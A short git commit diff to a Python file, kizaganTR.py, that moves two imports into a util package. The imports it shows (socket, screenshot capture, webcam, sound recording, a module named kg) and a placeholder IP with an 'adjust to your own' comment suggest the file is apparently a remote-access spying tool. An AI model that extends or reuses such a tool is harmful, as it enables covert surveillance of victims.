53a92e809e2998475648b7f2962a3caa39cac2cd
Yiğit Aydemir <68844502+st4inl3s5@users.noreply.github.com>
2022-07-10 16:48:24 +0300

    Update kizaganTR.py

--- kizaganTR.py
+++ kizaganTR.py
@@ -3,7 +3,7 @@ import os
 import simplejson
 import base64
 import socket
-import kg
+from util import kg
 import time
 import threading
 import pyttsx3
@@ -11,7 +11,7 @@ from PIL import ImageGrab
 import sys
 import shutil
 import cv2
-import sound_record
+from util import sound_record
 import tkinter
 
 ip = "192.168.1.105" # Bu değerleri kendinize göre değiştirin.
